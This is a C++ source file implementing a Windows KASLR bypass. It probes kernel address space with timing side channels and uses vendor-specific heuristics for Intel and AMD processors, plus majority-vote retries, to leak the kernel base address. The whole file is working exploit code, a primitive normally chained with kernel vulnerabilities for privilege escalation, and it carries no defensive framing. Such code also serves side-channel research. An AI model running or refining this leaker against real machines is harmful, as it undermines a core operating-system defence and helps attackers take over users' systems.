#include "KernelLeaker.h"
#include <iostream>
#include <format>
#include <algorithm>
#include <cstring>
#include <vector>
#include <unordered_map>
#include <Windows.h>
#include <winternl.h>

namespace kaslr {

    KernelLeaker::KernelLeaker(int verbose)
        : vendor_(detect_cpu_vendor())
        , verbose_(verbose)
    {
        if (vendor_ == CpuVendor::Unknown) {
            std::cerr << "Warning: Unknown CPU vendor detected!\n";
        }
    }

    // Queries Windows NT kernel for processor brand string to identify vendor
    CpuVendor KernelLeaker::detect_cpu_vendor() {
        auto ntdll = GetModuleHandleW(L"ntdll.dll");
        if (!ntdll) {
            std::cerr << "Failed to get ntdll.dll handle!\n";
            return CpuVendor::Unknown;
        }

        using NtQuerySystemInformationFn = NTSTATUS(WINAPI*)(
            SYSTEM_INFORMATION_CLASS, PVOID, ULONG, PULONG);
        
        auto NtQuerySystemInfo = reinterpret_cast<NtQuerySystemInformationFn>(
            GetProcAddress(ntdll, "NtQuerySystemInformation"));
        
        if (!NtQuerySystemInfo) {
            std::cerr << "Failed to get NtQuerySystemInformation!\n";
            return CpuVendor::Unknown;
        }

        // SystemProcessorBrandString = 105
        std::array<char, 256> brand_string{};
        ULONG returned_len = 0;
        
        NTSTATUS status = NtQuerySystemInfo(
            static_cast<SYSTEM_INFORMATION_CLASS>(105),
            brand_string.data(),
            static_cast<ULONG>(brand_string.size()),
            &returned_len
        );

        if (status != 0) {
            std::cerr << "Failed to query processor brand string!\n";
            return CpuVendor::Unknown;
        }

        std::cout << std::format("Processor: {}\n", brand_string.data());

        const char* brand = brand_string.data();
        if (std::strstr(brand, "Intel")) {
            if (std::strstr(brand, "N200")) {
                return CpuVendor::IntelN200;
            }
            return CpuVendor::Intel;
        }
        
        if (std::strstr(brand, "AMD")) {
            if (std::strstr(brand, "Mobile")) {
                return CpuVendor::AmdMobile;
            }
            return CpuVendor::Amd;
        }

        return CpuVendor::Unknown;
    }

    int KernelLeaker::average_sidechannel(void* addr) const {
        // INTENTIONAL: bad_syscall() performs kernel transition to flush CPU state
        // This is NOT a bug - it stabilizes microarchitectural state between measurements
        bad_syscall();
        uint64_t total = sidechannel(addr);
        
        for (size_t i = 0; i < config::ITERATIONS; ++i) {
            total += sidechannel(addr);
        }
        
        return static_cast<int>(total / (config::ITERATIONS + 1));
    }

    // Performs comprehensive timing sweep across kernel address space
    // Returns average cycle counts for each probed address
    std::array<uint64_t, config::ARRAY_SIZE> KernelLeaker::collect_timings() const {
        std::array<uint64_t, config::ARRAY_SIZE> data{};

        for (size_t iteration = 0; iteration < config::ITERATIONS + config::DUMMY_ITERATIONS; ++iteration) {
            for (size_t idx = 0; idx < config::ARRAY_SIZE; ++idx) {
                auto test_addr = reinterpret_cast<void*>(index_to_address(idx));
                bad_syscall();
                uint64_t time = sidechannel(test_addr);
                
                // Discard warm-up measurements to stabilize CPU state
                if (iteration >= config::DUMMY_ITERATIONS) {
                    data[idx] += time;
                }
            }
        }

        // Compute per-address averages
        for (auto& timing : data) {
            timing /= config::ITERATIONS;
        }

        return data;
    }

    // Optimized O(N) implementation using hash map
    // Replaces the previous O(N²) nested loop approach
    uint64_t KernelLeaker::calculate_most_frequent(
        const std::array<uint64_t, config::ARRAY_SIZE>& data)
    {
        // Hash map stores: [timing_value] -> [occurrence_count]
        // Using unordered_map for O(1) average access time via hashing
        std::unordered_map<uint64_t, size_t> frequency_map;
        frequency_map.reserve(data.size()); // Pre-allocate to avoid expensive rehashing
        
        // Track the current "champion" - the most frequent value seen so far
        size_t max_count = 0;
        uint64_t most_frequent_value = 0;

        // Single pass through the data - O(N) complexity
        for (const auto& timing : data) {
            // Increment counter for this timing value and get the new count
            // operator[] creates entry with default value (0) if key doesn't exist
            // Pre-increment returns the new value immediately
            size_t current_count = ++frequency_map[timing];
            
            // Check if this value just became the new record holder
            // This happens in real-time as we process the data
            if (current_count > max_count) {
                max_count = current_count;
                most_frequent_value = timing;
            }
        }

        return most_frequent_value;
    }

    // NEW: Simple Intel leak that finds address with absolute minimum timing
    // This works because kernel base typically has the lowest access latency
    std::optional<uint64_t> KernelLeaker::leak_intel_simple() const {
        auto data = collect_timings();
        
        // Find address with ABSOLUTE MINIMUM timing
        uint64_t min_timing = ~0ull;
        uint64_t best_addr = 0;
        size_t best_index = 0;
        
        for (size_t i = 0; i < config::ARRAY_SIZE; ++i) {
            if (data[i] < min_timing) {
                min_timing = data[i];
                best_addr = index_to_address(i);
                best_index = i;
            }
        }
        
        if (verbose_) {
            std::cout << std::format("Absolute minimum: {} cycles at {:p} (index: {})\n", 
                min_timing, reinterpret_cast<void*>(best_addr), best_index);
            
            // Debug: show nearby addresses to verify we found a cluster
            std::cout << "Nearby addresses for verification:\n";
            size_t start = (best_index > 5) ? best_index - 5 : 0;
            size_t end = best_index + 10;
            if (end > config::ARRAY_SIZE) {
                end = config::ARRAY_SIZE;
            }

            for (size_t i = start; i < end; ++i) {
                std::cout << std::format("  {:p}: {} cycles{}\n", 
                    reinterpret_cast<void*>(index_to_address(i)), 
                    data[i],
                    (i == best_index) ? " [MINIMUM]" : "");
            }
        }
        
        // Subtract 1MB offset to get the true kernel base
        // The minimum timing is often 1MB after the actual kernel base
        constexpr uint64_t OFFSET = 0x100000;
        if (best_addr < config::KERNEL_LOWER_BOUND + OFFSET) {
            if (verbose_) {
                std::cout << "Warning: Minimum address too close to lower bound, "
                          << "returning without correction\n";
            }
            return best_addr;
        }
        
        uint64_t corrected_addr = best_addr - OFFSET;
        
        if (verbose_) {
            std::cout << std::format("Corrected kernel base: {:p} (original minimum: {:p})\n",
                reinterpret_cast<void*>(corrected_addr), reinterpret_cast<void*>(best_addr));
        }
        
        return corrected_addr;
    }

    // Intel-specific leak using mode-based noise filtering
    // Intel exhibits LOWER timings for mapped kernel pages (fast speculative prefetch)
    std::optional<uint64_t> KernelLeaker::leak_intel() const {
        auto data = collect_timings();

        // Use mode instead of mean - robust against outliers in bimodal distribution
        avg_timing_ = calculate_most_frequent(data);

        // Clamp outliers to average (noise reduction)
        for (size_t i = 0; i < config::ARRAY_SIZE; ++i) {
            if (i == 0) continue;
            
            if (data[i] > avg_timing_) {
                data[i] = avg_timing_;
            }
            
            if (verbose_ > 1) {
                std::cout << std::format("{:016x} {}\n", index_to_address(i), data[i]);
            }
        }

        if (verbose_) {
            std::cout << std::format("avg for all: {}\n", avg_timing_);
        }

        const uint64_t thresh_1 = avg_timing_ / 10;
        const uint64_t thresh_2 = avg_timing_ / 30;

        // Search for consecutive low-timing sections (kernel mapping signature)
        for (size_t i = 0; i < config::ARRAY_SIZE - config::KERNEL_SECTIONS; ++i) {
            uint64_t section_avg = 0;
            bool section_valid = true;

            for (size_t x = 0; x < config::KERNEL_SECTIONS; ++x) {
                if (data[i + x] >= avg_timing_ - thresh_2) {
                    section_valid = false;
                    break;
                }
                section_avg += data[i + x];
            }

            if (!section_valid) continue;

            section_avg /= config::KERNEL_SECTIONS;
            
            if (verbose_) {
                std::cout << std::format("{:p} cur_avg: {}\n", 
                    reinterpret_cast<void*>(index_to_address(i)), section_avg);
            }

            if (section_avg < (avg_timing_ - thresh_1)) {
                return index_to_address(i);
            }
        }

        return std::nullopt;
    }

    // Intel N200 variant - uses simpler threshold due to different cache hierarchy
    std::optional<uint64_t> KernelLeaker::leak_intel_n200() const {
        auto data = collect_timings();

        uint64_t total = 0;
        for (const auto& timing : data) {
            total += timing;
        }
        avg_timing_ = total / config::ARRAY_SIZE;

        for (size_t i = 0; i < config::ARRAY_SIZE; ++i) {
            if (i == 0) continue;
            
            if (data[i] > avg_timing_) {
                data[i] = avg_timing_;
            }
            
            if (verbose_ > 1) {
                std::cout << std::format("{:016x} {}\n", index_to_address(i), data[i]);
            }
        }

        if (verbose_) {
            std::cout << std::format("avg for all: {}\n", avg_timing_);
        }

        // Use simple threshold to detect significantly lower timings
        const uint64_t delta = std::max<uint64_t>(1, avg_timing_ / 10);

        // Look for consecutive measurements significantly below average
        for (size_t i = 0; i < config::ARRAY_SIZE - 2; ++i) {
            // Skip early indices to avoid underflow when applying offset correction
            if (i < 9) continue;
            
            if (data[i] < avg_timing_ - delta &&
                data[i + 1] < avg_timing_ - delta)
            {
                return index_to_address(i - 9);
            }
        }

        return std::nullopt;
    }

    // AMD-specific leak with bimodal analysis
    // AMD exhibits HIGHER timings for mapped kernel pages (speculative access penalty)
    // CRITICAL: Uses mode-based noise filtering (improved from simple mean)
    std::optional<uint64_t> KernelLeaker::leak_amd() const {
        auto data = collect_timings();

        // BIMODAL ANALYSIS: Find noise peak (mode) instead of mean
        // This isolates the dominant unmapped-address timing cluster
        uint64_t noise_peak = calculate_most_frequent(data);
        
        if (verbose_) {
            std::cout << std::format("Noise peak (mode): {}\n", noise_peak);
        }

        // Extract signal timings (values significantly above noise floor)
        std::vector<uint64_t> signal_timings;
        const uint64_t noise_threshold = noise_peak / 6;
        
        for (size_t i = 0; i < config::ARRAY_SIZE; ++i) {
            if (data[i] > noise_peak + noise_threshold) {
                signal_timings.push_back(data[i]);
                
                if (verbose_ > 1) {
                    std::cout << std::format("{:016x} {} (SIGNAL)\n", 
                        index_to_address(i), data[i]);
                }
            } else if (verbose_ > 1) {
                std::cout << std::format("{:016x} {} (noise)\n", 
                    index_to_address(i), data[i]);
            }
        }

        // Compute average of signal cluster only (not contaminated by noise)
        if (signal_timings.empty()) {
            if (verbose_) {
                std::cout << "No signal detected above noise threshold\n";
            }
            return std::nullopt;
        }

        uint64_t signal_total = 0;
        for (const auto& timing : signal_timings) {
            signal_total += timing;
        }
        uint64_t signal_avg = signal_total / signal_timings.size();
        
        if (verbose_) {
            std::cout << std::format("Signal average: {} (from {} measurements)\n", 
                signal_avg, signal_timings.size());
        }

        // Normalize: treat sub-threshold values as noise floor
        for (size_t i = 0; i < config::ARRAY_SIZE; ++i) {
            if (data[i] < noise_peak) {
                data[i] = noise_peak;
            }
        }

        // Search for consecutive high-timing sections
        for (size_t i = 0; i < config::ARRAY_SIZE - config::KERNEL_SECTIONS; ++i) {
            uint64_t section_avg = 0;
            bool section_valid = true;

            for (size_t x = 0; x < config::KERNEL_SECTIONS; ++x) {
                // Require all section measurements to exceed noise floor
                if (data[i + x] <= noise_peak + noise_threshold / 2) {
                    section_valid = false;
                    break;
                }
                
                if (verbose_ > 0) {
                    std::cout << std::format("possible: {:p} {}\n",
                        reinterpret_cast<void*>(index_to_address(i + x)), data[i + x]);
                }
                
                section_avg += data[i + x];
            }

            if (!section_valid) continue;

            section_avg /= config::KERNEL_SECTIONS;
            
            // Accept section if it matches signal cluster characteristics
            if (section_avg > noise_peak + noise_threshold) {
                if (verbose_) {
                    std::cout << std::format("Found kernel section at {:p} (avg: {})\n",
                        reinterpret_cast<void*>(index_to_address(i)), section_avg);
                }
                return index_to_address(i);
            }
        }

        return std::nullopt;
    }

    // AMD Mobile variant with bimodal analysis
    // Mobile CPUs have aggressive power management causing higher variance
    std::optional<uint64_t> KernelLeaker::leak_amd_mobile() const {
        auto data = collect_timings();

        // Use mode to find dominant noise cluster
        uint64_t noise_peak = calculate_most_frequent(data);
        
        if (verbose_) {
            std::cout << std::format("Noise peak (mode): {}\n", noise_peak);
        }

        // Clamp extreme outliers (likely measurement artifacts)
        for (size_t i = 0; i < config::ARRAY_SIZE; ++i) {
            if (data[i] > (noise_peak * 4)) {
                data[i] = noise_peak;
            }
            
            if (verbose_ > 1) {
                std::cout << std::format("{:016x} {}\n", index_to_address(i), data[i]);
            }
        }

        const int noise_signed = static_cast<int>(noise_peak);
        const int deviation_threshold = noise_signed / 6;

        // Require significant deviation from noise in all section measurements
        for (size_t i = 0; i < config::ARRAY_SIZE - config::KERNEL_SECTIONS; ++i) {
            bool section_valid = true;

            for (size_t x = 0; x < config::KERNEL_SECTIONS; ++x) {
                int current_signed = static_cast<int>(data[i + x]);
                int deviation = std::abs(current_signed - noise_signed);
                
                if (deviation < deviation_threshold) {
                    section_valid = false;
                    break;
                }
            }

            if (section_valid) {
                if (verbose_) {
                    std::cout << std::format("Found kernel section at {:p}\n",
                        reinterpret_cast<void*>(index_to_address(i)));
                }
                return index_to_address(i);
            }
        }

        return std::nullopt;
    }

    // Improved reliability wrapper using majority voting instead of strict consecutive matching
    // Collects multiple samples and returns the most frequently detected address
    std::optional<uint64_t> KernelLeaker::leak_with_retry(
        std::optional<uint64_t> (KernelLeaker::*leak_fn)() const) const
    {
        constexpr size_t MAX_ATTEMPTS = 7;  // Must be odd for clear majority
        constexpr size_t REQUIRED_CONSENSUS = 4;  // 4 out of 7 = 57% majority
        
        // Hash map tracks: [detected_address] -> [occurrence_count]
        std::unordered_map<uint64_t, size_t> vote_count;
        
        for (size_t attempt = 0; attempt < MAX_ATTEMPTS; ++attempt) {
            auto current_leak = (this->*leak_fn)();
            
            if (!current_leak) {
                if (verbose_) {
                    std::cout << std::format("Attempt {}/{}: Leak failed, continuing...\n", 
                        attempt + 1, MAX_ATTEMPTS);
                }
                continue;  // Don't count failed attempts, just try again
            }
            
            // Register this vote
            uint64_t addr = *current_leak;
            size_t votes = ++vote_count[addr];
            
            if (verbose_) {
                std::cout << std::format("Attempt {}/{}: {:p} (votes: {})\n",
                    attempt + 1, MAX_ATTEMPTS,
                    reinterpret_cast<void*>(addr), votes);
            }
            
            // Early exit if we have clear consensus
            if (votes >= REQUIRED_CONSENSUS) {
                if (verbose_) {
                    std::cout << std::format("Consensus reached: {:p} with {}/{} votes\n",
                        reinterpret_cast<void*>(addr), votes, attempt + 1);
                }
                return addr;
            }
        }
        
        // No early consensus - find the winner from all attempts
        if (vote_count.empty()) {
            std::cerr << "All leak attempts failed!\n";
            return std::nullopt;
        }
        
        // Find address with most votes
        uint64_t winner = 0;
        size_t max_votes = 0;
        
        for (const auto& [addr, votes] : vote_count) {
            if (votes > max_votes) {
                max_votes = votes;
                winner = addr;
            }
        }
        
        if (verbose_) {
            std::cout << std::format("\nVoting results after {} attempts:\n", MAX_ATTEMPTS);
            for (const auto& [addr, votes] : vote_count) {
                std::cout << std::format("  {:p}: {} votes {}\n",
                    reinterpret_cast<void*>(addr), votes,
                    (addr == winner ? "[WINNER]" : ""));
            }
        }
        
        return winner;
    }

    // Main entry point - dispatches to architecture-specific implementation
    // NOW USES SIMPLE METHOD FOR INTEL CPUs
    std::optional<uint64_t> KernelLeaker::leak_kernel_base_reliable() {
        switch (vendor_) {
            case CpuVendor::Amd:
                return leak_with_retry(&KernelLeaker::leak_amd);
            
            case CpuVendor::AmdMobile:
                return leak_with_retry(&KernelLeaker::leak_amd_mobile);
            
            case CpuVendor::Intel:
            case CpuVendor::IntelN200:
                // USE SIMPLE METHOD FOR INTEL - finds absolute minimum timing
                return leak_with_retry(&KernelLeaker::leak_intel_simple);
            
            case CpuVendor::Unknown:
            default:
                std::cerr << "Unknown CPU vendor!\n";
                return std::nullopt;
        }
    }

    // Debug utility - dumps all timing measurements for analysis
    void KernelLeaker::print_timings() const {
        auto data = collect_timings();

        uint64_t min_timing = ~0ull;
        uint64_t min_addr = ~0ull;
        uint64_t total = 0;

        for (size_t i = 0; i < config::ARRAY_SIZE; ++i) {
            if (data[i] < min_timing) {
                min_timing = data[i];
                min_addr = index_to_address(i);
            }
            total += data[i];
            
            std::cout << std::format("{:016x} {}\n", index_to_address(i), data[i]);
        }

        uint64_t average = total / config::ARRAY_SIZE;
        std::cout << std::format("avg: {}\n", average);
        std::cout << std::format("min: {} at {:p}\n", min_timing, reinterpret_cast<void*>(min_addr));
    }

    std::string cpu_vendor_to_string(CpuVendor vendor) {
        switch (vendor) {
            case CpuVendor::Intel: return "Intel";
            case CpuVendor::IntelN200: return "Intel N200";
            case CpuVendor::Amd: return "AMD";
            case CpuVendor::AmdMobile: return "AMD Mobile";
            case CpuVendor::Unknown:
            default: return "Unknown";
        }
    }

} // namespace kaslr